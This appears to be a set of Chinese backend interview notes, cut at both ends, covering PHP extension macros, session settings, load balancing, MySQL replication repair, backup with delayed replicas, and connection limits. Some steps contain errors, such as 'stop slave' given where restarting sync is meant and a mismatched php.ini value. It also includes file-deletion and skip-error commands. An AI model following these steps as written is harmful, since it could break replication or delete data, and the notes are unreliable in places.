用于注册全局变量的构造和析构函数（参考表对宏参数的说明）：
复制代码代码如下:
ZEND_INIT_MODULE_GLOBALS(module_name, globals_ctor, globals_dtor)
表 ZEND_INIT_MODULE_GLOBALS 宏参数
参数	含义
module_name	与传递给ZEND_BEGIN_MODULE_GLOBALS()宏相同的扩展名称。
globals_ctor	构造函数指针。在myfile扩展里，函数原形与void php_myfile_init_globals(zend_myfile_globals *myfile_globals)类似
globals_dtor	析构函数指针。例如，php_myfile_init_globals(zend_myfile_globals *myfile_globals)
你可以在myfile.c里看到如何使用构造函数和ZEND_INIT_MODULE_GLOBALS()宏的示例。
添加自定义INI指令
INI文件(php.ini)的实现使得PHP扩展注册和监听各自的INI条目。
如果这些INI条目由php.ini、Apache的htaccess或其他配置方法来赋值，注册的INI变量总是更新到正确的值。
整个INI框架有许多不同的选项以实现其灵活性。我们涉及一些基本的（也是个好的开端），
借助本章的其他材料，我们就能够应付日常开发工作的需要。
通过在PHP_INI_BEGIN()/PHP_INI_END()宏之间的STD_PHP_INI_ENTRY()宏注册PHP INI指令。例如在我们的例子里，myfile.c中的注册过程应当如下：
复制代码代码如下:
PHP_INI_BEGIN()
STD_PHP_INI_ENTRY("myfile.global_value", "42", PHP_INI_ALL, OnUpdateInt, global_value, zend_myfile_globals, myfile_globals)
STD_PHP_INI_ENTRY("myfile.global_string", "foobar", PHP_INI_ALL, OnUpdateString, global_string, zend_myfile_globals, myfile_globals)
PHP_INI_END()
除了STD_PHP_INI_ENTRY()其他宏也能够使用，但这个宏是最常用的，可以满足大多数需要（参看表对宏参数的说明）：
复制代码代码如下:
STD_PHP_INI_ENTRY(name, default_value, modifiable, on_modify, property_name, struct_type, struct_ptr)
STD_PHP_INI_ENTRY 宏参数表
参数	含义
name	INI条目名
default_value	如果没有在INI文件中指定，条目的默认值。默认值始终是一个字符串。
modifiable	设定在何种环境下INI条目可以被更改的位域。可以的值是：
• PHP_INI_SYSTEM. 能够在php.ini或http.conf等系统文件更改
• PHP_INI_PERDIR. 能够在 .htaccess中更改
• PHP_INI_USER. 能够被用户脚本更改
• PHP_INI_ALL. 能够在所有地方更改
on_modify	处理INI条目更改的回调函数。你不需自己编写处理程序，使用下面提供的函数。包括：
• OnUpdateInt
• OnUpdateString
• OnUpdateBool
• OnUpdateStringUnempty
• OnUpdateReal
property_name	应当被更新的变量名
struct_type	变量驻留的结构类型。因为通常使用全局变量机制，所以这个类型自动被定义，类似于zend_myfile_globals。
struct_ptr	全局结构名。如果使用全局变量机制，该名为myfile_globals。
最后，为了使自定义INI条目机制正常工作，你需要分别去掉PHP_MINIT_FUNCTION(myfile)中的REGISTER_INI_ENTRIES()调用和PHP_MSHUTDOWN_FUNCTION(myfile)中的UNREGISTER_INI_ENTRIES()的注释。
访问两个示例全局变量中的一个与在扩展里编写MYFILE_G(global_value) 和MYFILE_G(global_string)一样简单。
如果你把下面的两行放在php.ini中，MYFILE_G(global_value)的值会变为99。
复制代码代码如下:
; php.ini – The following line sets the INI entry myfile.global_value to 99.myfile.global_value = 9
线程安全资源管理宏
现在，你肯定注意到以TSRM（线程安全资源管理器）开头的宏随处使用。这些宏提供给扩展拥有独自的全局变量的可能，正如前面提到的。
当编写PHP扩展时，无论是在多进程或多线程环境中，都是依靠这一机制访问扩展自己的全局变量。
如果使用全局变量访问宏（例如MYFILE_G()宏），需要确保TSRM上下文信息出现在当前函数中。
基于性能的原因，Zend引擎试图把这个上下文信息作为参数传递到更多的地方，包括PHP_FUNCTION()的定义。
正因为这样，在PHP_FUNCTION()内当编写的代码使用访问宏（例如MYFILE_G()宏）时，不需要做任何特殊的声明。
然而，如果PHP函数调用其他需要访问全局变量的C函数，要么把上下文作为一个额外的参数传递给C函数，要么提取上下文（要慢点）。
在需要访问全局变量的代码块开头使用TSRMLS_FETCH()来提取上下文。例如：
复制代码代码如下:
void myfunc(){
TSRMLS_FETCH();
MYFILE_G(myglobal) = 2;
}
如果希望让代码更加优化，更好的办法是直接传递上下文给函数（正如前面叙述的，PHP_FUNCTION()范围内自动可用）。
可以使用TSRMLS_C（C表示调用Call）和TSRMLS_CC（CC边式调用Call和逗号Comma）宏。
前者应当用于仅当上下文作为一个单独的参数，后者应用于接受多个参数的函数。
在后一种情况中，因为根据取名，逗号在上下文的前面，所以TSRMLS_CC不能是第一个函数参。
在函数原形中，可以分别使用TSRMLS_D和TSRMLS_DC宏声名正在接收上下文。
下面是前一例子的重写，利用了参数传递上下文。
复制代码代码如下:
void myfunc(TSRMLS_D){
MYFILE_G(myglobal) = 2;
}
PHP_FUNCTION(my_php_function)
{
…
myfunc(TSRMLS_C);
…
}
~

总 结
现在，你已经学到了足够的东西来创建自己的扩展。本章讲述了一些重要的基础来编写和理解PHP扩展。
Zend引擎提供的扩展API相当丰富，使你能够开发面向对象的扩展。几乎没有文档谈几许多高级特性。
当然，依靠本章所学的基础知识，你可以通过浏览现有的原码学到很多。
更多关于信息可以在PHP手册的扩展PHP章节http://www.php.net/manual/en/zend.php中找到。
另外，你也可以考虑加入PHP开发者邮件列表internals@ lists.php.net，该邮件列表围绕开发PHP 本身。
你还可以查看一下新的扩展生成工具——PECL_Gen(http://pear.php.net/package/PECL_Gen)，这个工具正在开发之中，
比起本章使用的ext_skel有更多的特性。
```

### 修改 PHP Session 存储位置、修改 INI 配置参数
```
n文件保存在c:/tmp目录下，默认tmp目录并没有创建，你可以在c盘下创建tmp目录，或者创建一个其他目录，
比如leapsoulcn，再修改session.save_path的值，并去掉;，即
session.save_path = ‘/leapsoulcn’;
注意事项：
1、一般为了保证服务器的安全，session.save_path值最好设置为外网无法访问的目录，
另外如果你是在linux服务器下进行session配置，请务必同时配置此目录为可读写权限，否则在执行session操作时会报错。
2、在使用session变量时，为了保证服务器的安全性，最好将register_globals设置为off，
以保证全局变量不混淆，在使用session_register()注册session变量时，你可以通过系统全局变量$_SESSION来访问，
比如你注册了leapsoulcn变量，你可以通过$_SESSION['leapsoulcn']来访问此变量。
session.save_path配置其他说明事项，从php.ini配置文件翻译而来
你可以使用”N;[MODE;]/path”这样模式定义该路径，N是一个整数，表示使用N层深度的子目录，
而不是将所有数据文件都保存在一个目录下。
[MODE;]可选，必须使用8进制数，默认600(=384)，表示每个目录下最多保存的会话文件数量。
[MODE;]并不会改写进程的umask。php不会自动创建这些文件夹结构。
可使用ext/session目录下的mod_files.sh脚本创建。如果该文件夹可以被不安全的用户访问(比如默认的”/tmp”)，
那么将会带来安全漏洞。当N>0时自动垃圾回收将会失效，具体参见下面有关垃圾搜集的部分。
如果你服务器上有多个虚拟主机，建议针对每个不同的虚拟主机分别设置各自不同的目录。
至此最基本的session配置就完成了，你只要保存php.ini，并重启apache，即可使用session功能。
其他session配置说明
session.save_handler = ”files”
默认以文件方式存取session数据，如果想要使用自定义的处理器来存取session数据，比如数据库，用”user”。
session.use_cookies = 1
是否使用cookies在客户端保存会话sessionid，默认为采用cookies
session.use_only_cookies = 0
是否仅仅使用cookie在客户端保存会话sessionid，这个选项可以使管理员禁止用户通过URL来传递id，默认为0，
如果禁用的话，客户端如果禁用Cookie将使session无法工作。
session.name = “PHPSESSID”
当做cookie name来使用的session标识名
session.auto_start = 0
是否自动启动session，默认不启动，我们知道在使用session功能时，
我们基本上在每个php脚本头部都会通过session_start()函数来启动session，
如果你启动这个选项，则在每个脚本头部都会自动启动session，不需要每个脚本头部都以session_start()函数启动session，
推荐关闭这个选项，采用默认值。
session.cookie_lifetime = 0
传递sessionid的Cookie有效期(秒)，0表示仅在浏览器打开期间有效。
session.gc_probability = 1
session.gc_divisor = 100
定义在每次初始化会话时，启动垃圾回收程序的概率。计算公式如下：session.gc_probability/session.gc_divisor，
比如1/100，表示有1%的概率启动启动垃圾回收程序，对会话页面访问越频繁，概率就应当越小。建议值为1/1000~5000。
session.gc_maxlifetime = 1440
设定保存的session文件生存期，超过此参数设定秒数后，保存的数据将被视为’垃圾’并由垃圾回收程序清理。
判断标准是最后访问数据的时间(对于FAT文件系统是最后刷新数据的时间)。
如果多个脚本共享同一个session.save_path目录但session.gc_maxlifetime不同，
将以所有session.gc_maxlifetime指令中的最小值为准。
如果你在session.save_path选项中设定使用子目录来存储session数据文件，垃圾回收程序不会自动启动，
你必须使用自己编写的shell脚本、cron项或者其他办法来执行垃圾搜集。
比如设置”session.gc_maxlifetime=1440″ (24分钟)：
cd /path/to/sessions; find -cmin +24 | xargs rm
以上是一些常用的session配置选项说明，更多的session配置选项说明你可以参考php.ini文件中的说明。
至此，在php.ini配置文件中对session进行配置的PHP教程就介绍完毕了，通过上面的步骤实践与学习，
基本的session功能都可以使用，至于session性能等其他方面则需要根据服务器环境和需求进行微调了，这个得自己体会。
```

### 负载均衡有哪几种，挑一种你熟悉的说明其原理
```
在说明常用负载均衡原理之前我们需要先知道何为“均衡”？
均衡，不能狭义地理解为分配给所有实际服务器一样多的工作量，因为多台服务器的承载能力各不相同，
这可能体现在硬件配置、网络带宽的差异，也可能因为某台服务器身兼多职，我们所说的“均衡”，
也就是希望所有服务器都不要过载，并且能够最大程序地发挥作用。
一、IP负载均衡(LVS-NAT)
因为反向代理服务器工作在HTTP层，其本身的开销就已经严重制约了可扩展性，从而也限制了它的性能极限。那能否在HTTP层面以下实现负载均衡呢？
当用户请求的数据包到达负载均衡服务器后，服务器会在操作系统内核进程获取网络数据包，
然后根据负载均衡算法计算得到一台真实的Web服务器，然后将数据目的地址修改为新的地址，
真实的Web服务器处理完成后，响应数据包会回到负载均衡服务器，负载均衡服务器再将数据包原地址修改为自身的IP发送给用户浏览器。
相较于反向代理负载均衡，IP负载均衡由于是在内核进程完成的数据分发，因此具有更好的处理性能。
但是仍然没有解决的一个问题是：所有请求响应都要经过负载均衡服务器，所以这个时候负载均衡服务器的网卡带宽就成为集群吞吐量的瓶颈。
二、DNS负载均衡
DNS负责提供域名解析服务，当访问某个站点时，实际上首先需要通过该站点域名的DNS服务器来获取域名指向的IP地址，
在这一过程中，DNS服务器完成了域名到IP地址的映射，同样，这样映射也可以是一对多的，
这时候，DNS服务器便充当了负载均衡调度器，它就像http重定向转换策略一样，
将用户的请求分散到多台服务器上，但是它的实现机制完全不同。
相比http重定向，基于DNS的负载均衡完全节省了所谓的主站点，或者说DNS服务器已经充当了主站点的职能。
但不同的是，作为调度器，DNS服务器本身的性能几乎不用担心。因为DNS记录可以被用户浏览器或者互联网接入服务商的各级DNS服务器缓存，
只有当缓存过期后才会重新向域名的DNS服务器请求解析。也说是DNS不存在http的吞吐率限制，理论上可以无限增加实际服务器的数量。
特性:
1、可以根据用户IP来进行智能解析。DNS服务器可以在所有可用的A记录中寻找离用记最近的一台服务器。
2、动态DNS：在每次IP地址变更时，及时更新DNS服务器。当然，因为缓存，一定的延迟不可避免。
不足：
1、没有用户能直接看到DNS解析到了哪一台实际服务器，加服务器运维人员的调试带来了不便。
2、策略的局限性。例如你无法将HTTP请求的上下文引入到调度策略中，而在前面介绍的基于HTTP重定向的负载均衡系统中，
调度器工作在HTTP层面，它可以充分理解HTTP请求后根据站点的应用逻辑来设计调度策略，
比如根据请求不同的URL来进行合理的过滤和转移。
3、如果要根据实际服务器的实时负载差异来调整调度策略，这需要DNS服务器在每次解析操作时分析各服务器的健康状态，
对于DNS服务器来说，这种自定义开发存在较高的门槛，更何况大多数站点只是使用第三方DNS服务。
4、DNS记录缓存，各级节点的DNS服务器不同程序的缓存会让你晕头转向。
5、基于以上几点，DNS服务器并不能很好地完成工作量均衡分配，最后，是否选择基于DNS的负载均衡方式完全取决于你的需要。
三、反向代理负载均衡
这个肯定大家都有所接触，因为几乎所有主流的Web服务器都热衷于支持基于反向代理的负载均衡。它的核心工作就是转发HTTP请求。
相比前面的HTTP重定向和DNS解析，反向代理的调度器扮演的是用户和实际服务器中间人的角色：
1、任何对于实际服务器的HTTP请求都必须经过调度器
2、调度器必须等待实际服务器的HTTP响应，并将它反馈给用户（前两种方式不需要经过调度反馈，是实际服务器直接发送给用户）
特性：
1、调度策略丰富。例如可以为不同的实际服务器设置不同的权重，以达到能者多劳的效果。
2、对反向代理服务器的并发处理能力要求高，因为它工作在HTTP层面。
3、反向代理服务器进行转发操作本身是需要一定开销的，比如创建线程、与后端服务器建立TCP连接、
接收后端服务器返回的处理结果、分析HTTP头部信息、用户空间和内核空间的频繁切换等，虽然这部分时间并不长，
但是当后端服务器处理请求的时间非常短时，转发的开销就显得尤为突出。例如请求静态文件，
更适合使用前面介绍的基于DNS的负载均衡方式。
4、反向代理服务器可以监控后端服务器，比如系统负载、响应时间、是否可用、TCP连接数、流量等，
从而根据这些数据调整负载均衡的策略。
5、反射代理服务器可以让用户在一次会话周期内的所有请求始终转发到一台特定的后端服务器上（粘滞会话），
这样的好处一是保持session的本地访问，二是防止后端服务器的动态内存缓存的资源浪费。
四、http重定向
当http代理（比如浏览器）向web服务器请求某个URL后，web服务器可以通过http响应头信息中的Location标记来返回一个新的URL。
这意味着HTTP代理需要继续请求这个新的URL，完成自动跳转。
性能缺陷：
1、吞吐率限制
主站点服务器的吞吐率平均分配到了被转移的服务器。现假设使用RR（Round Robin）调度策略，子服务器的最大吞吐率为1000reqs/s，
那么主服务器的吞吐率要达到3000reqs/s才能完全发挥三台子服务器的作用，那么如果有100台子服务器，
那么主服务器的吞吐率可想而知得有大？相反，如果主服务的最大吞吐率为6000reqs/s，
那么平均分配到子服务器的吞吐率为2000reqs/s，而现子服务器的最大吞吐率为1000reqs/s，
因此就得增加子服务器的数量，增加到6个才能满足。
2、重定向访问深度不同
有的重定向一个静态页面，有的重定向相比复杂的动态页面，那么实际服务器的负载差异是不可预料的，
而主站服务器却一无所知。因此整站使用重定向方法做负载均衡不太好。
我们需要权衡转移请求的开销和处理实际请求的开销，前者相对于后者越小，那么重定向的意义就越大，例如下载。
你可以去很多镜像下载网站试下，会发现基本下载都使用了Location做了重定向。
```

### 数据库主从复制 M-S 是怎么同步的？是推还是拉？会不会不同步？怎么办
```
0、为什么需要主从复制？
1、在业务复杂的系统中，有这么一个情景，有一句sql语句需要锁表，导致暂时不能使用读的服务，那么就很影响运行中的业务，
使用主从复制，让主库负责写，从库负责读，这样，即使主库出现了锁表的情景，通过读从库也可以保证业务的正常运作。
2、做数据的热备
3、架构的扩展。业务量越来越大，I/O访问频率过高，单机无法满足，此时做多库的存储，降低磁盘I/O访问的频率，提高单个机器的I/O性能。
1、什么是mysql的主从复制？
MySQL 主从复制是指数据可以从一个MySQL数据库服务器主节点复制到一个或多个从节点。
MySQL 默认采用异步复制方式，这样从节点不用一直访问主服务器来更新自己的数据，数据的更新可以在远程连接上进行，
从节点可以复制主数据库中的所有数据库或者特定的数据库，或者特定的表。
2、mysql复制原理
原理：
（1）master服务器将数据的改变记录二进制binlog日志，当master上的数据发生改变时，则将其改变写入二进制日志中；
（2）slave服务器会在一定时间间隔内对master二进制日志进行探测其是否发生改变，如果发生改变，则开始一个I/OThread请求master二进制事件
（3）同时主节点为每个I/O线程启动一个dump线程，用于向其发送二进制事件，并保存至从节点本地的中继日志中，从节点将启动SQL线程从中继日志中读取二进制日志，在本地重放，使得其数据和主节点的保持一致，最后I/OThread和SQLThread将进入睡眠状态，等待下一次被唤醒。
也就是说：
从库会生成两个线程,一个I/O线程,一个SQL线程;
I/O线程会去请求主库的binlog,并将得到的binlog写到本地的relay-log(中继日志)文件中;
主库会生成一个log dump线程,用来给从库I/O线程传binlog;
SQL线程,会读取relay log文件中的日志,并解析成sql语句逐一执行;
注意：
1--master将操作语句记录到binlog日志中，然后授予slave远程连接的权限
（master一定要开启binlog二进制日志功能；通常为了数据安全考虑，slave也开启binlog功能）。 
2--slave开启两个线程：IO线程和SQL线程。其中：IO线程负责读取master的binlog内容到中继日志relay log里；
SQL线程负责从relay log日志里读出binlog内容，并更新到slave的数据库里，这样就能保证slave数据和master数据保持一致了。 
3--Mysql复制至少需要两个Mysql的服务，当然Mysql服务可以分布在不同的服务器上，也可以在一台服务器上启动多个服务。 
4--Mysql复制最好确保master和slave服务器上的Mysql版本相同（如果不能满足版本一致，那么要保证master主节点的版本低于slave从节点的版本） 5--master和slave两节点间时间需同步

具体步骤：
1、从库通过手工执行change master to 语句连接主库，提供了连接的用户一切条件（user 、password、port、ip），
并且让从库知道，二进制日志的起点位置（file名 position 号）； start slave
2、从库的IO线程和主库的dump线程建立连接。
3、从库根据change master to 语句提供的file名和position号，IO线程向主库发起binlog的请求。
4、主库dump线程根据从库的请求，将本地binlog以events的方式发给从库IO线程。
5、从库IO线程接收binlog events，并存放到本地relay-log中，传送过来的信息，会记录到http://master.info中
6、从库SQL线程应用relay-log，并且把应用过的记录到http://relay-log.info中，默认情况下，已经应用过的relay 会自动被清理purge
3、mysql主从形式
（一）一主一从
（二）主主复制
（三）一主多从
（四）多主一从
（五）联级复制
4、mysql主从同步延时分析
mysql的主从复制都是单线程的操作，主库对所有DDL和DML产生的日志写进binlog，由于binlog是顺序写，所以效率很高，
slave的sql thread线程将主库的DDL和DML操作事件在slave中重放。
DML和DDL的IO操作是随机的，不是顺序，所以成本要高很多，另一方面，由于sql thread也是单线程的，
当主库的并发较高时，产生的DML数量超过slave的SQL thread所能处理的速度，
或者当slave中有大型query语句产生了锁等待，那么延时就产生了。
解决方案：
1.业务的持久化层的实现采用分库架构，mysql服务可平行扩展，分散压力。
2.单个库读写分离，一主多从，主写从读，分散压力。这样从库压力比主库高，保护主库。
3.服务的基础架构在业务和mysql之间加入memcache或者redis的cache层。降低mysql的读压力。
4.不同业务的mysql物理上放在不同机器，分散压力。
5.使用比主库更好的硬件设备作为slave，mysql压力小，延迟自然会变小。
6.使用更加强劲的硬件设备
主从复制中可能遇到主从数据不一致的情况，好了篇帖子，介绍比较详细
————————————如下———————————————-
先上Master库：
mysql>show processlist; 查看下进程是否Sleep太多。发现很正常。
show master status; 也正常。
mysql> show master status;
+——————-+———-+————–+——————————-+
| File | Position | Binlog_Do_DB | Binlog_Ignore_DB |
+——————-+———-+————–+——————————-+
| mysqld-bin.000001 | 3260 | | mysql,test,information_schema |
+——————-+———-+————–+——————————-+
1 row in set (0.00 sec)
再到Slave上查看
mysql> show slave status\G
Slave_IO_Running: Yes
Slave_SQL_Running: No
可见是Slave不同步

下面介绍两种解决方法：
方法一：忽略错误后，继续同步
该方法适用于主从库数据相差不大，或者要求数据可以不完全统一的情况，数据要求不严格的情况
解决：
stop slave;

表示跳过一步错误，后面的数字可变
set global sql_slave_skip_counter =1;
start slave;
之后再用mysql> show slave status\G 查看：
Slave_IO_Running: Yes
Slave_SQL_Running: Yes
ok，现在主从同步状态正常了。。。

方式二：重新做主从，完全同步
该方法适用于主从库数据相差较大，或者要求数据完全统一的情况
解决步骤如下：
1.先进入主库，进行锁表，防止数据写入
使用命令：
mysql> flush tables with read lock;
注意：该处是锁定为只读状态，语句不区分大小写
2.进行数据备份

把数据备份到mysql.bak.sql文件
[root@server01 mysql]#mysqldump -uroot -p -hlocalhost > mysql.bak.sql
这里注意一点：数据库备份一定要定期进行，可以用shell脚本或者python脚本，都比较方便，确保数据万无一失
3.查看master 状态
mysql> show master status;
+——————-+———-+————–+——————————-+
| File | Position | Binlog_Do_DB | Binlog_Ignore_DB |
+——————-+———-+————–+——————————-+
| mysqld-bin.000001 | 3260 | | mysql,test,information_schema |
+——————-+———-+————–+——————————-+
1 row in set (0.00 sec)
4.把mysql备份文件传到从库机器，进行数据恢复

使用scp命令
[root@server01 mysql]# scp mysql.bak.sql root@192.168.128.101:/tmp/
5.停止从库的状态
mysql> stop slave;
6.然后到从库执行mysql命令，导入数据备份
mysql> source /tmp/mysql.bak.sql
7.设置从库同步，注意该处的同步点，就是主库show master status信息里的| File| Position两项
change master to master_host = ‘192.168.128.100’, master_user = ‘rsync’, master_port=3306, master_password=”, master_log_file = ‘mysqld-bin.000001’, master_log_pos=3260;
8.重新开启从同步
mysql> stop slave;
9.查看同步状态
mysql> show slave status\G 查看：
Slave_IO_Running: Yes
Slave_SQL_Running: Yes
好了，同步完成啦。
```

### 如何保障数据的可用性，即使被删库了也能恢复到分钟级别。你会怎么做。
```
高可用数据库架构】
一般来说数据库集群会是主从架构：
或者主主架构：
如果此时主库宕机，可以：
（1）一个从库顶上，重建集群
（2）流量迁移到另一个主库
来保证数据的安全性与服务的可用性。
但是，如果人为不小心执行了“删全库”操作，命令会同步给其他从（主）库，导致所有库上的数据全部丢失，这下怎么办呢？
可以问问自己，当这种情况发生的时候：
（1）能不能恢复数据？（应该没有公司不能）
（2）多久能够恢复数据？
保证数据的安全性是DBA第一要务。
【全量备份+增量备份】
常见的数据库安全性策略是：全量备份+增量备份。
全量备份：定期（例如一个月）将库文件全量备份
增量备份：定期（例如每天）将binlog增量备份
如果不小心误删了全库，可以这么恢复：
（1）将最近一次全量备份的全库找到，拷贝回来（文件一般比较大），解压，应用
（2）将最近一次全量备份后，每一天的增量binlog找到，拷贝回来（文件较多），依次重放
（3）将最近一次增量备份后，到执行“删全库”之前的binlog找到，重放
恢复完毕。
为了保证方案的可靠性，建议定期进行恢复演练。
方案优点：能够找回数据
方案缺点：恢复时间非常长
有没有更优，更快恢复的方案呢？
【1小时延时从】
使用1小时延时从库，可大大加速“删全库”恢复时间。
什么是1小时延时从？
如图所示，增加一个从库，这个从库不是实时与主库保持同步的，而是每隔1个小时同步一次主库，
同步完之后立马断开1小时，这个从库会与主库保持1个小时的数据差距。
当“删全库”事故发生时，只需要：
（1）应用1小时延时从
（2）将1小时延时从最近一次同步时间到，将执行“删全库”之前的binlog找到，重放
快速恢复完毕。
方案优点：能够快速找回数据
潜在不足：万一，万一，万一，1小时延时从正在连上主库进行同步的一小段时间内，发生了“删全库”事故，那怎么办咧？
【双份1小时延时从】
使用双份1小时延时从库，可以避免上述“万一，万一，万一”的事故发生。
什么是双份1小时延时从？
如图所示，两个1小时延时从，他们连主库同步数据的时间“岔开半小时”。
这样，即使一个延时从连上主库进行同步的一小段时间内，发生了“删全库”事故，
依然有另一个延时从保有半小时之前的数据，可以实施快速恢复。
方案优点：没有万一，都能快速恢复数据
潜在不足：资源利用率有点低，为了保证数据的安全性，多了2台延时从，降低了从库利用率
【提高从库效率】
1小时延时从也不是完全没有用，对于一些“允许延时”的业务，可以使用1小时延时从，例如：
（1）运营后台，产品后台
（2）BI进行数据同步
（3）研发进行数据抽样，调研
但需要注意的是，毕竟这是从库，只能够提供“只读”服务哟。
【总结】
保证数据的安全性是DBA第一要务，需要进行：
（1）全量备份+增量备份，并定期进行恢复演练，但该方案恢复时间较久，对系统可用性影响大
（2）1小时延时从，双份1小时延时从能极大加速数据库恢复时间
（3）个人建议1小时延时从足够，后台只读服务可以连1小时延时从，提高资源利用率
```

### 数据库连接过多，超过最大值，如何优化架构。从哪些方便处理？
```
最近网站出现 User 数据库名称 has already more than 'max_user_connections' active connections 的报错，网站瘫痪。有必要研究下这个问题。
max_user_connections 是 MySQL 用户连接数的最大值设置，整段语句的意思是：服务器的 MySQL 的最大连接数参数设置不足。
解决方法：修改 MySQL 安装目录下 my.ini 或者 my.cnf 文件内的 max_user_connections 参数的数值，重启 MySQL 服务器。
但是正常来说，MySQL默认的100个连接数是足够的。我们需要从程序上去考虑。
MySQL的默认最大连接数为100（N），实际给普通用户使用只有N-1个，保留一个连接是留给超级管理员使用的，
防止连接占满了不会把管理员也踢出来。很多网站在运行的时候都会出现连接数受限现象，
我认为十之八九并非是网站的真实访问量太大导致连接数超标，更多是因为我们在设计网站程序的时候采用了不合理的设计架构或数据结构引起的。
非正常连接超限可能原因如下（天缘即时归纳未必完整或无错讹仅供参考）：
类似人数、在线时间、浏览数等统计功能与主程序数据库同属一个数据空间时就很容易出现。
复杂的动态页尤其是用户每次浏览都涉及到多数据库或多表操作时候也很容易出现。
还有就是程序设计的不合理（比如复杂运算、等待等操作放置在数据库交互行为中间进行），或者程序存在释放BUG。
计算机硬件配置太低却安装太高版、太高配置的MySQL。
未采用缓存技术。
数据库未经过优化或表格设计及其复杂。
等等一些原因，都会延长数据库的数据交互时间或增加交互次数。所以，如果大家遇到这类问题，
首先要考虑程序是否存在BUG导致连接释放失败，再次就是考虑优化软硬件。
当然修改MySQL连接数也是软件优化的操作方法之一，希望大家都能够本着学习的态度通过研究一下自身的原因从而解决这一问题。
如果实在是找不到原因，那就只好先修改连接数，暂缓定位真实原因了。
关于PHP的数据库持久连接 mysql_pconnect
PHP程序员应该都知道连接MySQL数据库可以使用mysql_pconnect（永久连接）函数，使用数据库永久连接可以提高效率，
但是实际应用中数据库永久连接往往会导致出现一些问题，通常的表现就是在大访问量的网站上时常发生断断续续的无法连接数据库的情况，
出现类似＂Too many connections in ...＂的错误提示信息，重新启动服务器又正常了，但过不了一会儿又出现同样的故障。
对于这些问题的成因，恐怕就不是每个人都能说清楚的了，虽然PHP文档里有一些相关资料，但是解释的并不浅显易懂，
这里我厚着脸皮试图做一个简单的讨论，所述观点不见得全都正确，欢迎大家反馈意见。
首先看看数据库永久连接的定义：永久的数据库连接是指在脚本结束运行时不关闭的连接。
当收到一个永久连接的请求时。PHP 将检查是否已经存在一个（前面已经开启的）相同的永久连接。
如果存在，将直接使用这个连接；如果不存在，则建立一个新的连接。所谓"相同"的连接是指用相同的用户名和密码到相同主机的连接。
PHP使用永久连接方式操作MySQL是有前提的：就是PHP必须安装为多线程或多进程Web服务器的插件或模块。
最常见的形式是把PHP用作多进程Apache服务器的一个模块。对于一个多进程的服务器，
其典型特征是有一个父进程和一组子进程协调运行，其中实际生成Web页面的是子进程。
每当客户端向父进程提出请求时，该请求会被传递给还没有被其它的客户端请求占用的子进程。
这也就是说当相同的客户端第二次向服务端提出请求时，它将有可能被一个不同的子进程来处理。
在开启了一个永久连接后，所有不同子进程请求SQL服务的后继页面都能够重新使用这个已经建立的 SQL服务器连接。
它使得每个子进程在其生命周期中只做一次连接操作，而非每次在处理一个页面时都要向 SQL 服务器提出连接请求。
每个子进程将对服务器建立各自独立的永久连接。PHP本身并没有数据库连接池的概念，但是Apache有进程池的概念, 
一个Apache子进程结束后会被放回进程池, 这也就使得用mysql_pconnect打开的的那个mysql连接资源可以不被释放，
而是依附在相应的Apache子进程上保存到了进程池中。于是在下一个连接请求时它就可以被复用。
一切看起来似乎都很正常，但是在Apache并发访问量大的时候，如果使用mysql_pconnect，
会由于之前的Apache子进程占用的MySQL连接没有close, 很快使MySQL达到最大连接数，使得之后的请求可能得不到响应。
上面的部分文字是摘抄自PHP文档，看起来可能还是有些文绉绉的不好理解，那么我就用大白话再举一个例子来说明问题：
假设Apache配置最大连接数为1000，MySQL配置最大连接数为100，当Apache服务器接到200个并发访问的时候，
其中100个涉及到数据库访问，剩下的100个不涉及数据库访问，因为这个时候还不存在可用的数据库连接，
所以这里面涉及到数据库访问的100个并发会同时产生100个数据库永久连接，达到了数据库最大连接数，
当这些操作没有结束的时候，任何其他的连接都无法再获得数据库连接，当这些操作结束了，相应的连接会被放入进程池，
此时Apache的进程池里就有了200个空闲的子进程，其中100个是带有数据库连接的，由于Apache会为访问请求随机的挑选空闲子进程，
所以你得到的子进程很可能是不包含数据库连接的那100个中的一个，而数据库连接已经达到了最大值，
你也不可能成功的建立新的数据库连接，唉，你便只好不停的刷新页面，哪个时候运气好，碰巧分配到了带有数据库连接的子进程，
才能正常浏览页面。如果是大访问量的网站来说，任何时候都可能存在大量的并发，
所以浏览者可能就会不停的发现无法连接数据库的现象了。
或许你会说，我们把Apache和MySQL的最大连接数调成一样大不就可以了么？是的，合理的调整这个最大连接数某种程度上会避免这个问题的发生，
但是Apache和MySQL的负载能力是不同的，如果按照Apache的负载能力来设置，对于MySQL来说，这个最大连接数就偏大，
会产生大量的MySQL数据库永久连接，打个比方，就好像和平时代还要养活一个几百万的军队一样，其开销得不偿失；
而如果按照Mysql的负载能力设置，对于Apache来说，这个最大连接数就偏小，有点杀鸡牛刀的感觉，无法发挥Apache的最大效率。
所以按照PHP手册上的介绍，只适合在并发访问不大的网站上使用数据库永久连接，但对于一个并发访问不大的网站来说，
使用数据库永久连接带来的效率提高似乎没有太大的意义，从这个角度上来看，我觉得PHP中的数据库永久连接基本上是一个鸡肋的角色，
如果你一定要使用数据库连接池的概念，可以尝试一下sqlrelay或者Apache本身提供的mod_dbd，说不定会有惊喜。
关于mysql_free_result和mysql_close
之前用mysql的时候一直是在用短链接，调用mysql_store_result获取一次数据之后就直接调用：
mysql_free_result(m_result);
mysql_close(m_Database);
但是有两个问题：
当使用长连接时（即connect之后一直不close），如果最后会调用mysql_close，需不需要每次都调用mysql_free_result呢?
当mysql_close调用之后，m_result的数据是否还可以用。
先说一下结论：
必须每次调用。因为经过测试，每次mysql_store_result的指针都是不同的，可见并不是共享了同一块buf。
还是可以使用。经过valgrind扫描，只调用mysql_close的扫描结果是：
==9397== 16,468 (88 direct, 16,380 indirect) bytes in 1 blocks are definitely lost in loss record 4 of 5
==9397==    at 0x40219B3: malloc (vg_replace_malloc.c:195)
==9397==    by 0x8053EA2: my_malloc (in /data/home/dantezhu/appbase/application/platform/openqqcom/share/db_openright/test/test)
==9397==    by 0x806D314: mysql_store_result (in /data/home/dantezhu/appbase/application/platform/openqqcom/share/db_openright/test/test)
==9397==    by 0x804BB04: CMySQLCppClient::Result(st_mysql_res*&) (mysql_cpp_client.cpp:127)
==9397==    by 0x804AB58: CDBOpenRight::GetUinsByApp(unsigned int, std::set<unsigned int, std::less<unsigned int>, std::allocator<unsigned int> >&) (db_openright.cpp:58)
==9397==    by 0x8049F10: main (test.cpp:27)
以后再慢慢研究。。
```

### 502 大概什么什么原因？ 如何排查  504呢？
```
状态代码解释
502 Bad Gateway：作为网关或者代理工作的服务器尝试执行请求时，从上游服务器接收到无效的响应。
504 Gateway Time-out：作为网关或者代理工作的服务器尝试执行请求时，
